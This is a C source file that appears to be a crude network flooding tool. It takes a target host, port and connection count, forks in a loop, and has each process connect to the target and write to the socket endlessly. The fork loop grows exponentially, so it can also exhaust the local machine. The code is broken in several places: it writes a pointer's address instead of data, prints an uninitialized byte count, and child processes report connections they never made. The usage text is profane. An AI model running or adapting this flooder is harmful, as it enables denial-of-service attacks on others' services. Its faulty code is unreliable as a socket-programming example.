#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <netdb.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include "restart.h"
#include "uici.h"
 
int main(int argc, char *argv[]) {
   int bytescopied;
   int communfd;
   int connections;
   int i;
   int pid;
   char *fuck = "AC4EX";
   u_port_t portnumber;
 
   if (argc != 4) {
      fprintf(stderr, " FUCKING USAGE: [host] [port] [max connections]\n");
      return 1;
   }
   connections = atoi(argv[3]);
   portnumber = (u_port_t)atoi(argv[2]);

   for(i = 0; i < connections; i++) {
	  pid = fork();
   }

   if(pid) {
   		if ((communfd = u_connect(portnumber, argv[1])) == -1) {
      		perror("Failed to make connection");
      		return 1;
   		}
		for( ; ; ) {
			write(communfd, &fuck, sizeof(fuck));
			//copyfile(fuck, communfd);
		}
   }
   

   fprintf(stderr, "[%d]:connected %s\n", getpid(), argv[1]);
   //bytescopied = copyfile(STDIN_FILENO, communfd);
   fprintf(stderr, "[%d]:sent %d bytes\n", getpid(), bytescopied);


   return 0;
}


